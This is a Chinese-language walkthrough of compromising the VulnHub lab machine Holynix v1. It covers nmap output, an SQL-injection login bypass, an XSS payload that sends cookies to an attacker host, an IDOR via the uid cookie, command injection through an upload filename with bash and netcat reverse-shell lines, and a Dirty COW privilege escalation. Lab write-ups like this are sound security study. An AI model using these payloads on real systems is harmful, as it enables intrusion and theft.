### 靶机描述

![靶机](vulnhubScreenShot/holynix-v1/1.jpg.png)
_这是一台标志低难度的靶机。整个挑战的目标是为了获得root级别的权限并且获得个人用户的私人信息。这个靶机需要手动用dhcp分配IP，步骤有些繁琐。_

#### 单用户模式配置dhcp

点击虚拟机的“开机进入固件”的选项。按esc键-> “不保存”然后按下enter键 然后看见这个界面
![boot1](vulnhubScreenShot/holynix-v1/holynix-2026-07-20-13-54-43.png)
长按esc按键，进入靶机GRUB界面
![boot2](vulnhubScreenShot/holynix-v1/holynix-2026-07-20-13-58-14.png)
根据英文提示，按e键编辑内核信息，将图片中命令ro后面全部删除，改成
![boot3](vulnhubScreenShot/holynix-v1/holynix-2026-07-20-13-58-27.png)
```
rw init=/bin/bash
```
![boot4](vulnhubScreenShot/holynix-v1/holynix-2026-07-20-13-58-53.png)
成功进入单用户模式
```shell
dhclient eth0
exec /sbin/init
```
![ip](vulnhubScreenShot/holynix-v1/holynix-2026-07-20-14-01-34.png)
至此，成功给靶机分配ip。

### 信息收集

#### nmap信息收集
靶机运行ip是192.168.2.41。

#### 端口扫描&& 详细扫描 && 漏洞脚本扫描
```text
# Nmap 7.98 scan initiated Mon Jul 20 04:37:39 2026 as: /usr/lib/nmap/nmap -sT --min-rate=10000 -p- -oA TCPS 192.168.2.41
Nmap scan report for 192.168.2.41
Host is up (0.0036s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:0C:29:75:B1:DE (VMware)

# Nmap done at Mon Jul 20 04:37:41 2026 -- 1 IP address (1 host up) scanned in 2.02 seconds

# Nmap 7.98 scan initiated Mon Jul 20 05:46:44 2026 as: /usr/lib/nmap/nmap -sT -sV -O -sC -p80 -oA nmapscan/details 192.168.2.41
Nmap scan report for 192.168.2.41
Host is up (0.00060s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch)
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:75:B1:DE (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router|specialized|WAP|phone
Running (JUST GUESSING): Linux 2.6.X|4.X (98%), Linksys embedded (93%), Kronos embedded (92%), ipTIME embedded (92%), Suga embedded (92%), Google Android 4.0.X (91%)
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/h:linksys:rv042 cpe:/o:linux:linux_kernel:4.4 cpe:/h:iptime:pro_54g cpe:/h:linksys:wrv54g cpe:/o:google:android:4.0.4
Aggressive OS guesses: Linux 2.6.24 - 2.6.25 (98%), Linux 2.6.35 (95%), Linux 2.6.22 (94%), Linux 2.6.18 - 2.6.24 (93%), Linksys RV042 router (93%), Linux 2.6.9 - 2.6.33 (92%), Linux 4.4 (92%), Kronos InTouch timeclock (92%), ipTIME PRO 54G WAP (92%), Linux 2.6.18 - 2.6.32 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul 20 05:46:59 2026 -- 1 IP address (1 host up) scanned in 15.29 seconds

# Nmap 7.98 scan initiated Mon Jul 20 05:48:13 2026 as: /usr/lib/nmap/nmap --script=vuln -p80 -oA nmapscan/vulns 192.168.2.41
Nmap scan report for 192.168.2.41
Host is up (0.00062s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-sql-injection: 
|   Possible sqli for queries:
|     http://192.168.2.41:80/?page=login.php%27%20OR%20sqlspider
|     http://192.168.2.41:80/?page=login.php%27%20OR%20sqlspider
|     http://192.168.2.41:80/index.php?page=login.php%27%20OR%20sqlspider
|     http://192.168.2.41:80/?page=login.php%27%20OR%20sqlspider
|     http://192.168.2.41:80/index.php?page=login.php%27%20OR%20sqlspider
|_    http://192.168.2.41:80/?page=login.php%27%20OR%20sqlspider
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.2.41
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.2.41:80/?page=login.php
|     Form id: 
|     Form action: /index.php?page=login.php
|     
|     Path: http://192.168.2.41:80/index.php?page=login.php
|     Form id: 
|_    Form action: /index.php?page=login.php
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-trace: TRACE is enabled
| http-enum: 
|   /login.php: Possible admin folder
|   /login/: Login page
|   /home/: Potentially interesting folder
|   /icons/: Potentially interesting folder w/ directory listing
|   /img/: Potentially interesting folder
|   /index/: Potentially interesting folder
|   /misc/: Potentially interesting folder
|   /transfer/: Potentially interesting folder
|_  /upload/: Potentially interesting folder
MAC Address: 00:0C:29:75:B1:DE (VMware)

# Nmap done at Mon Jul 20 05:53:35 2026 -- 1 IP address (1 host up) scanned in 321.96 seconds

```

目标开放了80端口。进行web的信息收集。

### Web渗透

#### 登录页面SQL注入漏洞

笔者一开始测试时，觉得用户名处是注入点的概率非常大。_(一般密码都是要进行密文存储的。)_ 
结果试了半天注入用户名。急得我掏出sqlmap进行测试。结果显示密码有注入......
![sql](vulnhubScreenShot/holynix-v1/2026-07-20-062026_2560x1600_scrot.png)
开始手工测试。发现是个报错注入。
![sql1](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_06_20_07.png)

```sql
password: 000' or 1=1 #
```
成功绕过登录看到用户界面。
![sql2](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_06_22_05.png)




#### 存储型XSS钓鱼
在测试网站文件上传功能的时候，发现当前用户alamo没法上传文件，于是想找个其他用户来测试文件上传功能。
![XSS](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_08_56_45.png)
构造payload
```javascript
<script>document.location='http://192.168.2.24/1.php?c='+document.cookie</script>
```
本地搭建一个简易web服务器
![payload](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_09_27_10.png)
![server](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_09_31_53.png)
等了很长时间，没有任何人上勾 _(图中显示的是我测试时候不小心误触的部分)_


#### web页面员工信息收集
在等待xss的过程中，开始翻看邮箱，论坛和公告。
![employee](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_06_27_10.png)
根据论坛的聊天内容来看，服务器有个22端口。用端口敲门技术隐藏了。
![ssh](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_21_39_44.png)

查找时，发现一个信息，这个叫etenenbaum的用户在外出差，jjames说他是不是在湖边。这是个隐藏彩蛋。
![lake](vulnhubScreenShot/holynix-v1/kali-linux-2026.1-vmware-amd64-2026-07-22-09-23-49.png)

#### 水平越权突破上传限制
抓包发现Cookie处使用uid=1来鉴别用户。uid=0表示未登录状态。如果uid=2或3会不会进入管理员账户？
![limit](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_06_22_31.png)
经过尝试后发现以下用户信息
```text
 alamo     1 Software Development
 etenenbaum 2 Security
 gmckinnon 3 Systems
 hreiser   4 Systems
 jdraper   5 Research
 jjames    6 Research
 jljohansen 7 Software Development
 kpoulsen  8 Systems
  ltorvalds 9 Administration
  mrbutler 10 Advertising
  rtmorris 11 Research

```
这里选用etenenbaum或者hreiser都行，他们都可以上传文件。这里为什么这么执着上次文件呢？因为服务器如果存在上传文件漏洞的话，那么我们可以上传一个webshell，可以很快获得立足点。

#### 上传功能处卡顿
虽然能够正常的上传文件了，但是不知道上传到哪个文件夹。
![failed](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_09_35_18.png)
它给我返回上传的文件的所有人已经变更。我不明白这是啥意思。_(后面会讲解，暂时不剧透)_
不断翻看目标爆破的结果，已经没有找到我的webshell木马文件。/img/目录下只有其他人的照片没有我的木马文件。而/home.php返回没有登录
![access](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_22_04_10.png)
我实现以为木马文件是上传到了home文件夹下面。只有找到一个授权的用户到home文件触发木马就可以回连。但是我错了，接连试着上方10几个用户都没有进入页面。笔者这边开始有点想放弃了......

#### 任意文件读取漏洞&&代码审计
调整了一下状态。在翻看web页面的过程注意到这里有一个page参数，参数里面填写的是页面php文件。我想会不会后端对这个参数没有校验，导致可以包含任意文件？简单尝试了一下。这个是文件包含的功能，但是有些莫名其妙的报错，利用不通。
![test](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_09_39_51.png)
正当我一筹莫展时，我突然想到Security模块能够将文件展示到前端。这边是不是会有文件读取漏洞呢？结果显而易见，是的。
![burp](vulnhubScreenShot/holynix-v1/kali-linux-2026.1-vmware-amd64-2026-07-22-10-10-24.png)

![code](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-20_22_45_27.png)
可以看到文件上传有个transfer.php页面。他会将我们上传的文件名拼接在命令中，使用php函数exec执行命令。如果我们能突破限制，就能执行我们自己的命令。我思路是选择这个 $\_FILES\['upload'\]\['name'\]    变量进行我的payload注入。就是在
```php
exec("sudo mv " .$target. " " .$homedir . $_FILES['uploaded']['name']);
```
注入payload,就是选择不自动解压gzip功能的那个分支。应为如果走解压分支。就会得到basename函数名的处理。basename虽然不是过滤功能的，但是会吃掉“/”这个路径符号前面的内容。导致我的payload失效。
![p1](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-21_03_05_00.png)
![p2](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-21_03_10_09.png)
![p3](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-21_04_23_51.png)
我草拟了一个payload的
```
2.jpg;/bin/bash -i >& /dev/tcp/192.168.2.24/5566 0>&1;
```
但是执行的结果是'5566 0>&1;'。很明显的我的“/”前面的内容被裁剪掉了。那么如何突破限制呢？
这里卡了很久，大概3个小时。AI给的，还是不能解决“/”的这个问题。
```
${IFS} 和 %20 都不对。
```
我改变payload。如下
```shell
2.tar.gz;nc 192.168.2.24 5566 -c bash
```
![p4](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-21_04_57_36.png)
![p5](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-21_04_58_23.png)
居然回显了。为啥一开始没想到，因为我以为不一定每台Linux主机都有netcat这样的软件。
本地回连过来。

### 权限提升
![stepstone](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-21_04_59_55.png)
简单看来一下当前的用户，在mv,tar,chown,chgrp这几个命令处有高执行权限。定时任务没法利用。我想着用tar的参数提权。但是目标环境的tar没有--checkpoint-action这个参数。
![tar](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-21_05_33_21.png)
最后还是选择了内核提权这条道路。因为这台机子内核版本2.6左右。选择如下
![kernel](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-21_07_02_20.png)

靶机wget命令下载后，使用gcc工具编译
![gcc](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-21_07_52_31.png)
![root](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-21_07_53_04.png)
运行成功提权。这里的firefart用户就是root级别的用户。
#### 战利品
![loot](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-21_07_55_13.png)
成功拿下root目录下，成员信息的sql文件
![sql](vulnhubScreenShot/holynix-v1/Screenshot_2026-07-21_07_58_55.png)
之前前文说的 “etenenbaum的用户在外出差，jjames说他是不是在湖边”，我在提权的时候，发现home文件夹下，etenenbaum文件夹下有张DC00001.JPG的图片。
![DC](vulnhubScreenShot/holynix-v1/DC.jpg)
一开始我还怀疑这个图片是不是影写了密码之类的。试了半天没啥结果。突然想到信息收集时候，看到的聊天记录......我发现callback了。
至此，这台机子就拿下了。

### 总结
这条靶机需要自己手动启用dhcp来分配ip。这个过程不算难，就是吃了经验少的苦。整个过程，从端口扫描到80端口开始。进入登录界面，发现有sql注入漏洞。通过"万能密码"进入用户界面。首先发现有文件上传的功能。但是当前用户不支持上传文件。我们想到去其他地方看看能不能找到其他用户的凭据。在聊天界面，发现输入框中有存储型XSS漏洞，就想到xss钓鱼。但是无果。在测试page这个参数时，意外发现页面有水平越权漏洞。通过这个漏洞有了上传文件的权限。但是找不到上传文件后的路径。一筹莫展之际，想到邮箱处能够读取文本文件。发现能够读取transfer.php文件源代码。通过审计，发现了命令执行漏洞。通过调整payload，成功获得www-data这个立足点。借助脏牛漏洞提权到root，拿下整台机子。